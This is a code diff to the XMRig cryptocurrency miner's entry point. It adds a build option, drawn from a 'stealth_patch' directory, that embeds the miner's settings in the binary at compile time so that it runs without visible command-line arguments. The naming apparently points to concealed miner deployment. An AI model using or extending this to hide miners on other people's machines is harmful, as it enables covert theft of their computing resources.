@@ -20,14 +20,36 @@
 #include "base/kernel/Entry.h"
 #include "base/kernel/Process.h"
 
+#ifdef INJECT_SETTINGS
+#include "stealth_patch/safe_string.h"
+#include "stealth_patch/prepare_config.cpp"
+#ifndef INJECTED_SETTINGS
+#error "INJECTED_SETTINGS must be defined with your command-line parameters"
+#endif // INJECTED_SETTINGS
+#endif // INJECT_SETTINGS
 
 int main(int argc, char **argv)
 {
     using namespace xmrig;
 
+#ifdef INJECT_SETTINGS
+
+    int count = 0;
+    char** provided_settings = split_string(SAFE_STRING(INJECTED_SETTINGS), &count);
+
+    char** injected_settings = new char*[count + 1];
+    injected_settings[0] = argv[0];
+    memcpy(injected_settings+1, provided_settings, count * sizeof(*provided_settings));
+    // free_split_string(provided_settings, count);
+
+    Process process(count+1, injected_settings);
+
+#else
     Process process(argc, argv);
+#endif // INJECT_SETTINGS
     const Entry::Id entry = Entry::get(process);
-    if (entry) {
+    if (entry)
+    {
         return Entry::exec(process, entry);
     }
 
